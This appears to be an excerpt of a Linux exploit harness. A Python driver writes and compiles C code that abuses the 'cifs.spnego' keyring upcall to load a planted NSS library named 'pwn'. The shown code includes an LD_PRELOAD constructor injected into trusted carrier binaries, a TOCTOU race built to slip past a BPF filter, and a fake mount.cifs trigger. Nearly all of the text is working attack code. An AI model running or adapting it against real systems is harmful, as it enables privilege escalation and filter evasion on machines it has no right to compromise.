...
__attribute__((constructor))
static void trigger_request_key(void)
{
        const char *pid_env = getenv("CIFSPWN_PID");
        if (!pid_env) return;

        int pid = atoi(pid_env);
        char desc[768];
        long ret;
        ...
        fprintf(stderr, "[LD_PRELOAD] request_key via exe=%s pid=%d\n",
                program_invocation_name, pid);
        errno = 0;
        ret = syscall(NR_request_key, "cifs.spnego", desc, "", 0);
        fprintf(stderr, "[LD_PRELOAD] rc=%ld errno=%d (%s)\n",
                ret, errno, strerror(errno));
        if (ret >= 0 || errno == ENOKEY || errno == EINTR) {
                fprintf(stderr, "[+] LD_PRELOAD bypass may have worked! waiting...\n");
                sleep(4);
        }
}
'''
...
#define EVIDENCE_PATH @@EVIDENCE_PATH@@
#define RACE_ITERS 20000000
#define NUM_FLIPPERS 1

static volatile int race_stop;
static volatile char *race_buf;
...
int main(int argc, char **argv)
{
        ...
        /*
         * === METHOD 0: TOCTOU race ===
         * BPF reads type string from user memory, then kernel reads
         * it AGAIN (copy_from_user). Flipper thread toggles first
         * byte between 'x' (innocent) and 'c' (cifs.spnego).
         * If BPF sees "xifs.spnego" -> allows, kernel sees
         * "cifs.spnego" -> processes -> upcall fires -> NSS loads.
         */
        {
                char tbuf[16];
                memcpy(tbuf, "cifs.spnego", 12);
                race_buf = tbuf;
                race_stop = 0;
                ...
                pthread_t tids[NUM_FLIPPERS];
                for (int f = 0; f < NUM_FLIPPERS; f++)
                        pthread_create(&tids[f], NULL, flipper_thread,
                                       (void*)(long)(f + 1));

                fprintf(stderr, "[toctou] Racing %d flippers, %dM iters...\n",
                        NUM_FLIPPERS, RACE_ITERS / 1000000);

                int eperm_cnt = 0, enokey_cnt = 0, other_cnt = 0;
                for (int i = 0; i < RACE_ITERS; i++) {
                        errno = 0;
                        ret = syscall(NR_request_key, race_buf, desc, "", 0L);
                        if (ret >= 0) {
                                fprintf(stderr, "[+] TOCTOU WON attempt %d rc=%ld\n", i, ret);
                                race_stop = 1;
                                sleep(5);
                                for (int f = 0; f < NUM_FLIPPERS; f++)
                        ...
                        int e = errno;
                        if (e == EPERM) eperm_cnt++;
                        else if (e == ENOKEY) enokey_cnt++;
                        else other_cnt++;

                        if (e == EINTR) {
                                fprintf(stderr, "[*] TOCTOU got EINTR at %d — handler may run!\n", i);
                                race_stop = 1;
                                sleep(5);
                                for (int f = 0; f < NUM_FLIPPERS; f++)
                                        pthread_join(tids[f], NULL);
                        ...
                        if (i % 1000000 == 0 && i > 0) {
                                fprintf(stderr, "    %dM: eperm=%d enokey=%d other=%d\n",
                                        i / 1000000, eperm_cnt, enokey_cnt, other_cnt);
                                if (access(EVIDENCE_PATH, F_OK) == 0) {
                                        fprintf(stderr, "[+] Evidence found! Race worked!\n");
                                        race_stop = 1;
                                        sleep(2);
                                        for (int f = 0; f < NUM_FLIPPERS; f++)
                                                pthread_join(tids[f], NULL);
                ...
                for (int f = 0; f < NUM_FLIPPERS; f++)
                        pthread_join(tids[f], NULL);
                fprintf(stderr, "[toctou] Done: eperm=%d enokey=%d other=%d\n",
                        eperm_cnt, enokey_cnt, other_cnt);
                if (access(EVIDENCE_PATH, F_OK) == 0) {
                        fprintf(stderr, "[+] Evidence found after race!\n");
                        return 0;
                }
        }

        /*
         * === METHOD 1: native request_key (fallback) ===
         */
        fprintf(stderr, "[native] request_key(249) pid=%d\n", pid);
        errno = 0;
        ret = syscall(NR_request_key, "cifs.spnego", desc, "", 0L);
        fprintf(stderr, "    rc=%ld errno=%d (%s)\n",
                ret, errno, strerror(errno));
        if (ret >= 0 || errno == ENOKEY || errno == EINTR) { sleep(5); return 0; }
...
def main() -> None:
    ...
    write_text(WORKDIR / "trigger.c",
               TRIGGER_SOURCE.replace("@@EVIDENCE_PATH@@", c_string_literal(EVIDENCE_LOG)))
    write_text(
        FAKE_NSSWITCH,
        """
        passwd: pwn files
    ...
    write_text(WORKDIR / "ldtrigger.c", LDPRELOAD_TRIGGER_SOURCE)
    run(["gcc", "-Wall", "-Wextra", "-shared", "-fPIC", "-o", "fakelib/libnss_pwn.so.2", "libnss_pwn.c"], cwd=WORKDIR)
    run(["gcc", "-Wall", "-Wextra", "-shared", "-fPIC", "-o", "ldtrigger.so", "ldtrigger.c"], cwd=WORKDIR)
    run(["gcc", "-Wall", "-Wextra", "-o", "ns_holder", "ns_holder.c"], cwd=WORKDIR)
    run(["gcc", "-Wall", "-Wextra", "-o", "mount.cifs", "trigger.c", "-lpthread"], cwd=WORKDIR)
    ...
    try:
        ...
        step("LD_PRELOAD BYPASS — trusted binary as carrier")
        ldtrigger_so = str(WORKDIR / "ldtrigger.so")
        carrier_env = dict(os.environ)
        carrier_env["LD_PRELOAD"] = ldtrigger_so
        carrier_env["CIFSPWN_PID"] = str(holder_pid)
        ...
        for carrier in carrier_bins:
            if not os.path.isfile(carrier):
                print("skip %s (not found)" % carrier, flush=True)
                continue
            print("trying LD_PRELOAD via %s" % carrier, flush=True)
            ...
            if carrier_result.stdout:
                print(carrier_result.stdout, end="", flush=True)
            time.sleep(1)
            evidence = read_evidence()
            if evidence:
                print("[+] LD_PRELOAD via %s WORKED!" % carrier, flush=True)
                break

        if not read_evidence():
            step("TRIGGERING UPCALL — direct trigger binary")
